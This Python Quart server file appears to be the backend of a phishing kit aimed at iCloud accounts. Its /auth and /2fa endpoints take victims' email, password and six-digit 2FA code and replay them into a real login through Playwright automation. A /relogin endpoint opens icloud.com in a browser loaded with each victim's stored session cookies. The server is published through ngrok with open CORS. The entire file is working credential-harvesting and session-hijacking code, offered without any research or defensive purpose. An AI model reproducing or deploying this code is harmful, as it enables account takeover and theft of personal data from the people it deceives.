# To run with ngrok: python api.py
# To run locally: hypercorn api:app --bind 127.0.0.1:5000

from __future__ import annotations

from quart import Quart, request, send_from_directory, jsonify
from src.main import Conf, start_login, f_2fa
from uuid import uuid4
from typing import Any
from quart_cors import cors
from playwright.async_api import async_playwright
import asyncio, os
from src.ngrok import run
from pathlib import Path


app = Quart(__name__)
app = cors(
    app,
    allow_origin="*"
)

from dataclasses import dataclass

@dataclass
class S_Conf:
    pages: str = os.path.join(
        os.path.dirname(
            __file__
        ), 
        'pages'
    )
    etc: str = os.path.join(
        os.path.dirname(
            __file__
        ), 
        'etc'
    )
    system: str = os.path.join(
        os.path.dirname(
            __file__
        ), 
        'system'
    )

static_config = S_Conf()

@app.route(
    '/', 
    defaults={'path': ''}
)
@app.route('/<path:path>')
async def serve_static(
    path
):
    if path == '' or path == '/':
        return await send_from_directory(
            static_config.pages, 
            'index.html'
        )
    if path.endswith(
        '.html'
    ):
        page = path.split('/')[-1]
        return await send_from_directory(
            static_config.pages, 
            page
        )
    if path.startswith('etc/'):
        return await send_from_directory(
            static_config.etc, 
            path[
                len(
                    'etc/'
                ):
            ]
        )
    if path.startswith(
        'system/'
    ):
        return await send_from_directory(
            static_config.system, 
            path[
                len(
                    'system/'
                ):
            ]
        )
    return await send_from_directory(
        static_config.pages, 
        'index.html'
    ), 200

sessions: dict[str, dict[str, Any]] = {}
playwright = None 


@app.before_serving
async def startup():
    global playwright
    playwright = await async_playwright().start()


@app.after_serving
async def shutdown():
    global playwright
    if playwright:
        await playwright.stop()
        playwright = None


@app.route("/auth", methods=["POST"])
async def start_auth() -> tuple[dict, int]:
    data = await request.get_json()
    email = data.get("email")
    password = data.get("password")

    if not email or not password:
        return {
            "error": "both email & pass are required"
        }, 400

    creds = Conf(
        email=email,
        password=password,
        code=""
    )

    session_id = str(uuid4())
    sessions[session_id] = {
        "creds": creds,
        "step": "password"
    }

    try:
        browser, context, page, status = await start_login(
            creds=creds,
            playwright=playwright
        )

        if status == "2fa":
            sessions[
                session_id]["step"] = "2fa"
            sessions[session_id]["browser"] = browser
            sessions[session_id]["context"] = context
            sessions[session_id]["page"] = page
            return {
                "message": "2FA required",
                "session_id": session_id
            }, 202

    except RuntimeError as err:
        msg = str(err).lower()

        if 'browser' in locals() and browser is not None:
            if 'context' in locals() and context is not None:
                await context.close()
            await browser.close()
            
        del sessions[session_id]
        if "wrong info" in msg or "invalid password" in msg:
            return {
                "error": "invalid email or password"
            }, 401
        return {
            "error": msg
        }, 500

    del sessions[session_id]
    return {
        "message": "authenticated"
    }, 200

@app.route("/2fa", methods=["POST"])
async def finish_auth() -> tuple[dict, int]:
    data = await request.get_json()
    session_id = data.get("session_id")
    code = data.get("code")

    if not session_id or session_id not in sessions:
        return {
            "error": "invalid or expired session"
        }, 400

    if not code or not code.isdigit() or len(code) != 6:
        return {
            "error": "invalid 2fa code format"
        }, 400

    creds = sessions[session_id]["creds"]
    creds.code = code
    browser = sessions[session_id].pop(
        "browser",
        None
    )
    context = sessions[session_id].pop(
        "context",
        None
    )
    page = sessions[session_id].pop(
        "page",
        None
    )

    try:
        await f_2fa(
            creds=creds,
            browser=browser,
            context=context,
            page=page
        )

    except RuntimeError as err:
        msg = str(err).lower()
        if "incorrect 2fa" in msg:
            return {
                "error": "wrong 2fa code"
            }, 401

        return {
            "error": msg
        }, 500

    except Exception as err:
        import traceback
        tb = traceback.format_exc()
        return {
            "error": str(err),
            "trace": tb
        }, 500

    del sessions[session_id]
    return {
        "message": "2fa verified. login complete."
    }, 200

# curl "http://127.0.0.1:5000/relogin?email={email}" 
@app.route('/relogin')
async def relogin():
    email = request.args.get(
        "email"
    )
    if not email:
        print(
            "missing email param"
        )
        return jsonify(
            {"status": "error", "message": "missing email param"}
        ), 400

    username = email.split("@")[0]
    cookies_path = Path(
        f"users/user_{username}.json"
    )

    if not cookies_path.exists():
        return jsonify(
            {"status": "error", "message": "no cookie file"}
        ), 404

    async def launch():
        browser = await playwright.chromium.launch(
            headless=False
        )
        context = await browser.new_context(
            storage_state=str(
                cookies_path
            )
        )
        page = await context.new_page()
        await page.goto(
            "https://www.icloud.com/"
        )
        await page.wait_for_load_state(
            "domcontentloaded"
        )

        await browser.wait_for_event(
            "disconnected"
        )

    asyncio.create_task(
        launch()
    )

    return jsonify(
        {"status": "ok", "message": f"browser with cookies for -> {email}"}
    )


if __name__ == "__main__":
    asyncio.run(
        run(
            app, 
            port=5000, 
            bind="127.0.0.1"
        )
    )